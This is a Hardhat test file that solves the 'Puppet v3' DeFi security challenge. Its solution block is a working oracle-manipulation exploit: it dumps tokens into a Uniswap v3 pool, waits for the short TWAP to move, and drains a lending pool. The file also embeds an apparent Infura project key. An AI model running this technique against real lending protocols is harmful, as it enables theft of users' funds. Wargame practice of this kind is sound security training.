const { ethers } = require('hardhat');
const { expect } = require('chai');
const { time, setBalance } = require("@nomicfoundation/hardhat-network-helpers");

const positionManagerJson = require("@uniswap/v3-periphery/artifacts/contracts/NonfungiblePositionManager.sol/NonfungiblePositionManager.json");
const factoryJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Factory.sol/UniswapV3Factory.json");
const poolJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Pool.sol/UniswapV3Pool.json");
const routerJson = require('@uniswap/swap-router-contracts/artifacts/contracts/SwapRouter02.sol/SwapRouter02.json');
  
  // deploy the bytecode
// See https://github.com/Uniswap/v3-periphery/blob/5bcdd9f67f9394f3159dad80d0dd01d37ca08c66/test/shared/encodePriceSqrt.ts
const bn = require("bignumber.js");
bn.config({ EXPONENTIAL_AT: 999999, DECIMAL_PLACES: 40 });
function encodePriceSqrt(reserve0, reserve1) {
    return ethers.BigNumber.from(
        new bn(reserve1.toString())
            .div(reserve0.toString())
            .sqrt()
            .multipliedBy(new bn(2).pow(96))
            .integerValue(3)
            .toString()
    )
}
// sqrtprice = [((reserve1 / reserve0) ** (0.5)) * (2 ** 96)]

describe('[Challenge] Puppet v3', function () {
    let deployer, player;
    let uniswapFactory, weth, token, uniswapPositionManager, uniswapPool, lendingPool;
    let initialBlockTimestamp;

    /** SET RPC URL HERE */
    const MAINNET_FORKING_URL = "https://mainnet.infura.io/v3/2N7yp4DUu80pxg5dnzC9t0Pj9dM";

    // Initial liquidity amounts for Uniswap v3 pool
    const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
    const UNISWAP_INITIAL_WETH_LIQUIDITY = 100n * 10n ** 18n;

    const PLAYER_INITIAL_TOKEN_BALANCE = 110n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 18n;
    const DEPLOYER_INITIAL_ETH_BALANCE = 200n * 10n ** 18n;

    const LENDING_POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        // Fork from mainnet state
        await ethers.provider.send("hardhat_reset", [{
            forking: { jsonRpcUrl: MAINNET_FORKING_URL, blockNumber: 15450164 }
        }]);

        // Initialize player account
        // using private key of account #2 in Hardhat's node
        player = new ethers.Wallet("0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d", ethers.provider);
        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);

        // Initialize deployer account
        // using private key of account #1 in Hardhat's node
        deployer = new ethers.Wallet("0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80", ethers.provider);
        await setBalance(deployer.address, DEPLOYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(deployer.address)).to.eq(DEPLOYER_INITIAL_ETH_BALANCE);

        // Get a reference to the Uniswap V3 Factory contract
        uniswapFactory = new ethers.Contract("0x1F98431c8aD98523631AE4a59f267346ea31F984", factoryJson.abi, deployer);

        // Get a reference to WETH9
        weth = (await ethers.getContractFactory('WETH', deployer)).attach("0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2");

        // Deployer wraps ETH in WETH
        await weth.deposit({ value: UNISWAP_INITIAL_WETH_LIQUIDITY });
        expect(await weth.balanceOf(deployer.address)).to.eq(UNISWAP_INITIAL_WETH_LIQUIDITY);

        // Deploy DVT token. This is the token to be traded against WETH in the Uniswap v3 pool.
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        
        // Create the Uniswap v3 pool
        uniswapPositionManager = new ethers.Contract("0xC36442b4a4522E871399CD717aBDD847Ab11FE88", positionManagerJson.abi, deployer);
        const FEE = 3000; // 0.3%
        await uniswapPositionManager.createAndInitializePoolIfNecessary(
            weth.address,  // token0
            token.address, // token1
            FEE,
            encodePriceSqrt(1, 1),
            { gasLimit: 5000000 }
        );

        let uniswapPoolAddress = await uniswapFactory.getPool(
            weth.address,
            token.address,
            FEE
        );
        uniswapPool = new ethers.Contract(uniswapPoolAddress, poolJson.abi, deployer);
        await uniswapPool.increaseObservationCardinalityNext(40);
        
        // Deployer adds liquidity at current price to Uniswap V3 exchange
        await weth.approve(uniswapPositionManager.address, ethers.constants.MaxUint256);
        await token.approve(uniswapPositionManager.address, ethers.constants.MaxUint256);
        await uniswapPositionManager.mint({
            token0: weth.address,
            token1: token.address,
            tickLower: -60,
            tickUpper: 60,
            fee: FEE,
            recipient: deployer.address,
            amount0Desired: UNISWAP_INITIAL_WETH_LIQUIDITY,
            amount1Desired: UNISWAP_INITIAL_TOKEN_LIQUIDITY,
            amount0Min: 0,
            amount1Min: 0,
            deadline: (await ethers.provider.getBlock('latest')).timestamp * 2,
        }, { gasLimit: 5000000 });        

        // Deploy the lending pool
        lendingPool = await (await ethers.getContractFactory('PuppetV3Pool', deployer)).deploy(
            weth.address,
            token.address,
            uniswapPool.address
        );

        // Setup initial token balances of lending pool and player
        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await token.transfer(lendingPool.address, LENDING_POOL_INITIAL_TOKEN_BALANCE);

        // Some time passes
        await time.increase(3 * 24 * 60 * 60); // 3 days in seconds

        // Ensure oracle in lending pool is working as expected. At this point, DVT/WETH price should be 1:1.
        // To borrow 1 DVT, must deposit 3 ETH
        expect(
            await lendingPool.calculateDepositOfWETHRequired(1n * 10n ** 18n)
        ).to.be.eq(3n * 10n ** 18n);

        // To borrow all DVT in lending pool, user must deposit three times its value
        expect(
            await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(LENDING_POOL_INITIAL_TOKEN_BALANCE * 3n);

        // Ensure player doesn't have that much ETH
        expect(await ethers.provider.getBalance(player.address)).to.be.lt(LENDING_POOL_INITIAL_TOKEN_BALANCE * 3n);

        initialBlockTimestamp = (await ethers.provider.getBlock('latest')).timestamp;
    });

    /**
     * @dev
     * Overview of exploit:
     *
     * Exploit is very similar to Puppet-V2 except this uses Uniswap's V3 Time
     * Weighted Average Price (TWAP) to calculate the price. We also need to
     * connect to Uniswaps Router to make our lives easier.
     *
     * This can be exploited if the TWAP period is short enough that it is still
     * suseptible to short term violatility, which is exactly what happens here.
     *
     * We make a trade buying all WETH in the pool, heavily devaluing the DVT
     * token relative to the WETH token.
     *
     * However if we were to get the price directly after the trade, the price
     * would still be 1:1 since the new price has a Time Weight of 0.
     *
     * So we need to wait a few minutes for the TWAP to move to an appropriate
     * price (110 seconds) then call the lending pool which then uses the
     * heavily devalued price
     */
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // Connect to contracts as attacker
        const attackPool = await uniswapPool.connect(player);
        const attackLendingPool = await lendingPool.connect(player);
        const attackToken = await token.connect(player);
        const attackWeth = await weth.connect(player);

        // Helper function to log balances of addresses
        const logBalances = async (name, address) => {
            const dvt_bal = await attackToken.balanceOf(address);
            const weth_bal = await weth.balanceOf(address);
            const eth_bal = await ethers.provider.getBalance(address);
            console.log(`Logging balance of ${name}`);
            console.log('DVT:', ethers.utils.formatEther(dvt_bal))
            console.log('WETH:', ethers.utils.formatEther(weth_bal))
            console.log('ETH:', ethers.utils.formatEther(eth_bal))
            console.log('')
        };

        await logBalances("Player", player.address)

        // Helper function to get quotes from the Lending pool
        const getQuote = async(amount, print=true) => {
            const quote = await attackLendingPool.calculateDepositOfWETHRequired(amount);
            if (print) console.log(`Quote of ${ethers.utils.formatEther(amount)} DVT is ${ethers.utils.formatEther(quote)} WETH`)
            return quote
        }

        const uniswapRouterAddress = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45";
        console.log(`Connecting to uniswap router at mainnet address ${uniswapRouterAddress}`)
        const uniswapRouter = new ethers.Contract(uniswapRouterAddress, routerJson.abi, player);

        console.log("Approving all player tokens to be taken from the uniswap router");
        await attackToken.approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);

        console.log("Swapping all player tokens for as much WETH as possible.");
        await uniswapRouter.exactInputSingle(
            [attackToken.address,  // dvt tokens
            weth.address,     // weth tokens
            3000,
            player.address,
            PLAYER_INITIAL_TOKEN_BALANCE, // 110 DVT TOKENS
            0,
            0],
            {
                gasLimit: 1e7
            }
        );

        await logBalances("Player", player.address)
        await logBalances("Uniswap Pool", attackPool.address)

        // Increase block time by 100 seconds
        console.log("Increasing block time by 100 seconds")
        await time.increase(100);

        // Get new quote for borrow and approve lending pool for that amount
        console.log("Getting new quote and approving lending pool for transfer");
        const quote = await getQuote(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        await attackWeth.approve(attackLendingPool.address, quote);

        // Borrow the funds
        console.log("Borrowing funds");
        await attackLendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);

        await logBalances("Player", player.address);
        await logBalances("Lending Pool", attackLendingPool.address)
        
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Block timestamp must not have changed too much
        expect(
            (await ethers.provider.getBlock('latest')).timestamp - initialBlockTimestamp
        ).to.be.lt(115, 'Too much time passed');

        // Player has taken all tokens out of the pool        
        expect(
            await token.balanceOf(lendingPool.address)
        ).to.be.eq(0);
        expect(
            await token.balanceOf(player.address)
        ).to.be.gte(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    });
});